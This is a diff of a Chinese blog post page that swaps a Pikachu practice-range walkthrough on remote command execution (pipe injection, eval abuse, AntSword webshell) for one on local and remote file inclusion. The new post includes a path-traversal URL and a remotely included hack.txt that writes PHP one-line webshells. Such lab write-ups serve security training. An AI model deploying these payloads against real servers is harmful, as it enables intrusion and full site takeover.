@@ -16,32 +16,33 @@
   <meta name="author" content="儒道易行">
   <meta name="keywords" content="">
   
-    <meta name="description" content="5.RCE1.RCE(remote commandcode execute)概述RCE(remote command&#x2F;code execute)概述 RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 远程系统命令执行 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口 比如我们常见的路由器、防火墙、入侵检测等设备的web">
+    <meta name="description" content="6.File Inclusion1.File Inclusion(文件包含漏洞)概述File Inclusion(文件包含漏洞)概述 文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了： include(),include_once() require(),require_once() 这些">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Pikachu靶场-RCE">
-<meta property="og:url" content="http://rdyx0.github.io/2019/09/12/Pikachu%E9%9D%B6%E5%9C%BA-RCE/index.html">
+<meta property="og:title" content="Pikachu靶场-File Inclusion">
+<meta property="og:url" content="http://rdyx0.github.io/2019/09/13/Pikachu%E9%9D%B6%E5%9C%BA-File%20Inclusion/index.html">
 <meta property="og:site_name" content="儒道易行">
-<meta property="og:description" content="5.RCE1.RCE(remote commandcode execute)概述RCE(remote command&#x2F;code execute)概述 RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 远程系统命令执行 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口 比如我们常见的路由器、防火墙、入侵检测等设备的web">
+<meta property="og:description" content="6.File Inclusion1.File Inclusion(文件包含漏洞)概述File Inclusion(文件包含漏洞)概述 文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了： include(),include_once() require(),require_once() 这些">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/f396a336ec61464c8cf14784381b1e80.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2c2e310700044c61b41c9d74817a5dc4.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/a91ac585e0ca453883bc0568042da095.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2531eae6cd104ecf98fe1ad2ecea4150.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/e886d61a36174379be3d1a8bf9685486.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/abdf698781c542d696a13bd7f2787417.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/b0fb40dbfbe144d1aebafa9adb85b0db.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/d1b1bfb40e444f999abde2b5d1a0d69e.png">
-<meta property="article:published_time" content="2019-09-12T13:36:15.000Z">
-<meta property="article:modified_time" content="2022-12-29T09:35:41.711Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/31d32050aa1947a48dd2453a1a019372.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/71c10e35675a4e4bac9081e24edde54b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/56b468bd0ed74efca82ab1f4e6aff565.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/748744e3eed04781b44eabc0853c8103.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/af51eab88b834d3d861f9bcbb049275a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e8c28c9fb56a4f2f836e962ecaee7f91.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9d2e032e2b1543c2aea40a74083aae33.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/31814198e6ca421e84e72b176a71ab89.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f535216c991949f1be74db85157d358c.png">
+<meta property="article:published_time" content="2019-09-13T13:36:15.000Z">
+<meta property="article:modified_time" content="2022-12-29T11:16:26.007Z">
 <meta property="article:author" content="儒道易行">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/f396a336ec61464c8cf14784381b1e80.png">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/31d32050aa1947a48dd2453a1a019372.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Pikachu靶场-RCE - 儒道易行</title>
+  <title>Pikachu靶场-File Inclusion - 儒道易行</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -197,7 +198,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Pikachu靶场-RCE"></span>
+            <span id="subtitle" data-typed-text="Pikachu靶场-File Inclusion"></span>
           
         </div>
 
@@ -208,8 +209,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2019-09-12 21:36" pubdate>
-          2019年9月12日 晚上
+        <time datetime="2019-09-13 21:36" pubdate>
+          2019年9月13日 晚上
         </time>
       </span>
     
@@ -220,7 +221,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          2.6k 字
         
       </span>
     
@@ -231,7 +232,7 @@
         
         
         
-          14 分钟
+          22 分钟
         
       </span>
     
@@ -277,52 +278,72 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Pikachu靶场-RCE</h1>
+            <h1 style="display: none">Pikachu靶场-File Inclusion</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="5-RCE"><a href="#5-RCE" class="headerlink" title="5.RCE"></a>5.RCE</h1><h2 id="1-RCE-remote-commandcode-execute-概述"><a href="#1-RCE-remote-commandcode-execute-概述" class="headerlink" title="1.RCE(remote commandcode execute)概述"></a>1.RCE(remote commandcode execute)概述</h2><p>RCE(remote command&#x2F;code execute)概述</p>
-<p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
-<p>远程系统命令执行</p>
-<p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口</p>
-<p>比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上</p>
-<p>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器</p>
-<p>现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的”收获”-_-</p>
-<p>远程代码执行</p>
-<p>同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。</p>
-<p>因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>
-<h2 id="2-exec-ping"><a href="#2-exec-ping" class="headerlink" title="2.exec ping"></a>2.exec ping</h2><p>因为靶场环境是ubuntu</p>
-<p>使用管道符 | 执行 ping x.x.x.x | whoami 相当于执行了两个命令 但是最终会显示 whoami 命令的结果</p>
-<p>后台命令代码类似于shell_exec(‘ping -C 4’.$ip)，造成了RCE远程系统命令执行</p>
-<p>输入x.x.x.x | whoami命令</p>
-<p><img src="https://img-blog.csdnimg.cn/f396a336ec61464c8cf14784381b1e80.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p>输入x.x.x.x | ls命令</p>
-<p><img src="https://img-blog.csdnimg.cn/2c2e310700044c61b41c9d74817a5dc4.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<h2 id="3-exec-eval"><a href="#3-exec-eval" class="headerlink" title="3.exec eval"></a>3.exec eval</h2><p>查看源代码，发现内容提交后直接传入 @!eval中 ，如果不报错就会执行 ，如果报错就会输出一句话</p>
-<p>所以我们可以利用这个漏洞执行代码语句</p>
-<p><img src="https://img-blog.csdnimg.cn/a91ac585e0ca453883bc0568042da095.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p>输入phpinfo(); 发现输出了phpinfo页面</p>
-<p>将用户输入的字符串当做php脚本了解析执行, 并且没有做严格的过滤处理, 导致了漏洞的产生</p>
-<p><img src="https://img-blog.csdnimg.cn/2531eae6cd104ecf98fe1ad2ecea4150.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p>查看请求头可知请求类型为POST, 对应的参数为txt:</p>
-<p><img src="https://img-blog.csdnimg.cn/e886d61a36174379be3d1a8bf9685486.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p>利用蚁剑进行连接</p>
-<p><img src="https://img-blog.csdnimg.cn/abdf698781c542d696a13bd7f2787417.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p>修改请求头的submit参数</p>
-<p><img src="https://img-blog.csdnimg.cn/b0fb40dbfbe144d1aebafa9adb85b0db.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p>成功连接</p>
-<p><img src="https://img-blog.csdnimg.cn/d1b1bfb40e444f999abde2b5d1a0d69e.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+                <h1 id="6-File-Inclusion"><a href="#6-File-Inclusion" class="headerlink" title="6.File Inclusion"></a>6.File Inclusion</h1><h2 id="1-File-Inclusion-文件包含漏洞-概述"><a href="#1-File-Inclusion-文件包含漏洞-概述" class="headerlink" title="1.File Inclusion(文件包含漏洞)概述"></a>1.File Inclusion(文件包含漏洞)概述</h2><p>File Inclusion(文件包含漏洞)概述</p>
+<p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：</p>
+<p>include(),include_once()</p>
+<p>require(),require_once()</p>
+<p>这些文件包含函数，这些函数在代码设计中被经常使用到。</p>
+<p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：</p>
+<p>1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。</p>
+<p>2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。</p>
+<p>因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</p>
+<h2 id="2-File-Inclusion-local"><a href="#2-File-Inclusion-local" class="headerlink" title="2.File Inclusion(local)"></a>2.File Inclusion(local)</h2><p>查看源码，没有做任何过滤，变量传进去直接包含</p>
+<p><img src="https://img-blog.csdnimg.cn/31d32050aa1947a48dd2453a1a019372.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>点击kobe，提交</p>
+<p>可以看到读取了file1.php，在include里面创建一个phpinfo.php文件</p>
+<p><img src="https://img-blog.csdnimg.cn/71c10e35675a4e4bac9081e24edde54b.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>对url进行修改，可以利用文件上传漏洞上传的phpinfo文件，在此处进行包含(详情见文件上传靶场，此处直接利用)</p>
+<p><a target="_blank" rel="noopener" href="http://x.x.x.x/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/phpinfo.php&amp;submit=%E6%8F%90%E4%BA%A4">http://x.x.x.x/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/phpinfo.php&amp;submit=%E6%8F%90%E4%BA%A4</a></p>
+<p><img src="https://img-blog.csdnimg.cn/56b468bd0ed74efca82ab1f4e6aff565.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="3-File-Inclusion-remote"><a href="#3-File-Inclusion-remote" class="headerlink" title="3.File Inclusion(remote)"></a>3.File Inclusion(remote)</h2><p>在php.ini配置文件打开这个选项</p>
+<p><img src="https://img-blog.csdnimg.cn/748744e3eed04781b44eabc0853c8103.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>查看源码</p>
+<p><img src="https://img-blog.csdnimg.cn/af51eab88b834d3d861f9bcbb049275a.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>条件: </p>
+<p>\1. php.ini中allow_url_include和allow_url_fopen的开启</p>
+<p>\2. 所包含的远程文件后缀不能与目标服务器语言相同. (比如目标服务器是php解析的, 远程服务器的文件不能是php)</p>
+<p>分析</p>
+<p>和本地包含的类似, 直接在可控参数filename传入远程服务器文件的地址即可</p>
+<p>漏洞利用</p>
+<p>这里演示写入一句话木马</p>
+<p>攻击者会现在自己的服务器上写好一个一句话木马, 格式是txt文本, (上面说了不能包含同后缀的文件, 是把其他类型的文件当做php解析)</p>
+<p>hack.txt:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php<br>    $myfile = fopen(&quot;hack.php&quot;, &quot;w&quot;);<br>    $txt = &#x27;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt;&#x27;;<br>    fwrite($myfile, $txt);<br>    fclose($myfile);<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>远程包含的地址: </p>
+<p><a target="_blank" rel="noopener" href="http://192.168.10.100/pikachu-master/hack.txt">http://192.168.10.100/pikachu-master/hack.txt</a></p>
+<p>然后通过修改filename的值来包含:</p>
+<p><img src="https://img-blog.csdnimg.cn/e8c28c9fb56a4f2f836e962ecaee7f91.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>如果权限不够则会报错:</p>
+<p><img src="https://img-blog.csdnimg.cn/9d2e032e2b1543c2aea40a74083aae33.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这边为了方便演示, 我改了下权限, </p>
+<p>远程包含hack.txt文件后, hack.txt文件就会被当做php来解析执行。然后网站目录下就生成了hack.php一句话木马:</p>
+<p><img src="https://img-blog.csdnimg.cn/31814198e6ca421e84e72b176a71ab89.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>攻击者就可以通过该木马来控制整个网站:</p>
+<p><img src="https://img-blog.csdnimg.cn/f535216c991949f1be74db85157d358c.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>另外,</p>
+<p>当然我们也可以这样写一句话木马:</p>
+<p>hack.txt:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;hack.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;hack&quot;]);?&gt;&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>, <span class="hljs-variable">$txt</span>);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>是GET的请求方式的话, 就可以直接通过URL来执行了:</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu-master/vul/fileinclude/hack.php?hack=pwd">http://127.0.0.1/pikachu-master/vul/fileinclude/hack.php?hack=pwd</a></p>
+<p>本文部分内容转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/angry_program/article/details/104428305">https://blog.csdn.net/angry_program/article/details/104428305</a></p>
 <p>免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。</p>
 <p>转载声明：儒道易行 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。</p>
 <p>博客:</p>
 <p><a href="https://rdyx0.github.io/">https://rdyx0.github.io/</a></p>
-<p>FreeBuf：</p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85">https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85</a></p>
-<p>公众号：</p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTU2NjA1Mw==&action=getalbum&album_id=1696286248027357190&scene=173&from_msgid=2247485408&from_itemidx=1&count=3&nolastread=1#wechat_redirect">https://mp.weixin.qq.com/mp/appmsgalbum?__biz&#x3D;Mzg5NTU2NjA1Mw&#x3D;&#x3D;&amp;action&#x3D;getalbum&amp;album_id&#x3D;1696286248027357190&amp;scene&#x3D;173&amp;from_msgid&#x3D;2247485408&amp;from_itemidx&#x3D;1&amp;count&#x3D;3&amp;nolastread&#x3D;1#wechat_redirect</a></p>
 <p>CSDN:</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48899364?type=blog">https://blog.csdn.net/weixin_48899364?type&#x3D;blog</a></p>
+<p>公众号：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTU2NjA1Mw==&action=getalbum&album_id=1696286248027357190&scene=173&from_msgid=2247485408&from_itemidx=1&count=3&nolastread=1#wechat_redirect">https://mp.weixin.qq.com/mp/appmsgalbum?__biz&#x3D;Mzg5NTU2NjA1Mw&#x3D;&#x3D;&amp;action&#x3D;getalbum&amp;album_id&#x3D;1696286248027357190&amp;scene&#x3D;173&amp;from_msgid&#x3D;2247485408&amp;from_itemidx&#x3D;1&amp;count&#x3D;3&amp;nolastread&#x3D;1#wechat_redirect</a></p>
+<p>FreeBuf：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85">https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85</a></p>
 <p>先知社区：</p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/u/37846">https://xz.aliyun.com/u/37846</a></p>
 
@@ -342,8 +363,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Pikachu靶场-RCE</div>
-      <div>http://rdyx0.github.io/2019/09/12/Pikachu靶场-RCE/</div>
+      <div>Pikachu靶场-File Inclusion</div>
+      <div>http://rdyx0.github.io/2019/09/13/Pikachu靶场-File Inclusion/</div>
     </div>
     <div class="license-meta">
       
@@ -355,7 +376,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2019年9月12日</div>
+          <div>2019年9月13日</div>
         </div>
       
       
@@ -387,18 +408,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2019/09/13/Pikachu%E9%9D%B6%E5%9C%BA-File%20Inclusion/" title="Pikachu靶场-File Inclusion">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Pikachu靶场-File Inclusion</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2019/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/" title="Pikachu靶场-SQL-Inject">
-                        <span class="hidden-mobile">Pikachu靶场-SQL-Inject</span>
+                      <a href="/2019/09/12/Pikachu%E9%9D%B6%E5%9C%BA-RCE/" title="Pikachu靶场-RCE">
+                        <span class="hidden-mobile">Pikachu靶场-RCE</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
